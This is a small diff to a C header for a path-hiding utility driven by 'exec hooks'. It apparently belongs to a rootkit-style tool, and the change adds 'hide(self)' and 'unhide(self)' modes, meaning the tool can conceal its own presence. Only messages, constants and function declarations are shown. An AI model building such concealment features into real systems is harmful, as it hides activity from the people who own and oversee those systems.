@@ -9,7 +9,7 @@
   /* these are all of the messages that can & will
    * be shown upon interaction with the (un)hiding
    * util via the exec hooks. */
-#define ERR_NO_OPTION     "need option 'hide' or 'unhide' and said path"
+#define ERR_NO_OPTION     "need option 'hide(self)' or 'unhide(self)' (and a path if performing file op)"
 #define ERR_STAT_PATH     "cannot stat path, (does it exist?)"
 #define ALRDY_HIDDEN_STR  "path is already hidden..."
 #define PATH_HIDDEN_STR   "path now hidden"
@@ -18,8 +18,13 @@
 #define PATH_VISIBLE_STR  "path now visible"
 #define ERR_UNHIDING_PATH "error unhiding path"
 
+/* defined modes for do_self() */
+#define HIDEME   0x01
+#define UNHIDEME 0x02
+
+void do_self(short mode);
 void option_err(void);
-void dohiding_util(char *const argv[]);
+void do_hidingutil(char *const argv[]);
 #include "hiding_util.c"
 #endif
 
